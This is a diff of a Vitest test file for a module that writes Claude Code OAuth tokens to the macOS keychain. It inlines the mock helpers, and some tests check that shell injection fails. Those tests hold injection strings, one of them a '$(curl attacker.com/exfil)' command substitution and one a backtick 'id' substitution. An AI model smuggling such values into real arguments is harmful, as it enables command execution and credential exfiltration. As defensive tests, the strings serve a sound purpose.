@@ -6,31 +6,6 @@ import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 const execSyncMock = vi.fn();
 const execFileSyncMock = vi.fn();
 
-function mockExistingClaudeKeychainItem() {
-  execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
-    const argv = Array.isArray(args) ? args.map(String) : [];
-    if (String(file) === "security" && argv.includes("find-generic-password")) {
-      return JSON.stringify({
-        claudeAiOauth: {
-          accessToken: "old-access",
-          refreshToken: "old-refresh",
-          expiresAt: Date.now() + 60_000,
-        },
-      });
-    }
-    return "";
-  });
-}
-
-function getAddGenericPasswordCall() {
-  return execFileSyncMock.mock.calls.find(
-    ([binary, args]) =>
-      String(binary) === "security" &&
-      Array.isArray(args) &&
-      (args as unknown[]).map(String).includes("add-generic-password"),
-  );
-}
-
 describe("cli credentials", () => {
   beforeEach(() => {
     vi.useFakeTimers();
@@ -46,7 +21,19 @@ describe("cli credentials", () => {
   });
 
   it("updates the Claude Code keychain item in place", async () => {
-    mockExistingClaudeKeychainItem();
+    execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
+      const argv = Array.isArray(args) ? args.map(String) : [];
+      if (String(file) === "security" && argv.includes("find-generic-password")) {
+        return JSON.stringify({
+          claudeAiOauth: {
+            accessToken: "old-access",
+            refreshToken: "old-refresh",
+            expiresAt: Date.now() + 60_000,
+          },
+        });
+      }
+      return "";
+    });
 
     const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
@@ -63,7 +50,12 @@ describe("cli credentials", () => {
 
     // Verify execFileSync was called with array args (no shell interpretation)
     expect(execFileSyncMock).toHaveBeenCalledTimes(2);
-    const addCall = getAddGenericPasswordCall();
+    const addCall = execFileSyncMock.mock.calls.find(
+      ([binary, args]) =>
+        String(binary) === "security" &&
+        Array.isArray(args) &&
+        (args as unknown[]).map(String).includes("add-generic-password"),
+    );
     expect(addCall?.[0]).toBe("security");
     expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
   });
@@ -71,7 +63,19 @@ describe("cli credentials", () => {
   it("prevents shell injection via malicious OAuth token values", async () => {
     const maliciousToken = "x'$(curl attacker.com/exfil)'y";
 
-    mockExistingClaudeKeychainItem();
+    execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
+      const argv = Array.isArray(args) ? args.map(String) : [];
+      if (String(file) === "security" && argv.includes("find-generic-password")) {
+        return JSON.stringify({
+          claudeAiOauth: {
+            accessToken: "old-access",
+            refreshToken: "old-refresh",
+            expiresAt: Date.now() + 60_000,
+          },
+        });
+      }
+      return "";
+    });
 
     const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
@@ -87,7 +91,12 @@ describe("cli credentials", () => {
     expect(ok).toBe(true);
 
     // The -w argument must contain the malicious string literally, not shell-expanded
-    const addCall = getAddGenericPasswordCall();
+    const addCall = execFileSyncMock.mock.calls.find(
+      ([binary, args]) =>
+        String(binary) === "security" &&
+        Array.isArray(args) &&
+        (args as unknown[]).map(String).includes("add-generic-password"),
+    );
     const args = (addCall?.[1] as string[] | undefined) ?? [];
     const wIndex = args.indexOf("-w");
     const passwordValue = args[wIndex + 1];
@@ -99,7 +108,19 @@ describe("cli credentials", () => {
   it("prevents shell injection via backtick command substitution in tokens", async () => {
     const backtickPayload = "token`id`value";
 
-    mockExistingClaudeKeychainItem();
+    execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
+      const argv = Array.isArray(args) ? args.map(String) : [];
+      if (String(file) === "security" && argv.includes("find-generic-password")) {
+        return JSON.stringify({
+          claudeAiOauth: {
+            accessToken: "old-access",
+            refreshToken: "old-refresh",
+            expiresAt: Date.now() + 60_000,
+          },
+        });
+      }
+      return "";
+    });
 
     const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
@@ -115,7 +136,12 @@ describe("cli credentials", () => {
     expect(ok).toBe(true);
 
     // Backtick payload must be passed literally, not interpreted
-    const addCall = getAddGenericPasswordCall();
+    const addCall = execFileSyncMock.mock.calls.find(
+      ([binary, args]) =>
+        String(binary) === "security" &&
+        Array.isArray(args) &&
+        (args as unknown[]).map(String).includes("add-generic-password"),
+    );
     const args = (addCall?.[1] as string[] | undefined) ?? [];
     const wIndex = args.indexOf("-w");
     const passwordValue = args[wIndex + 1];
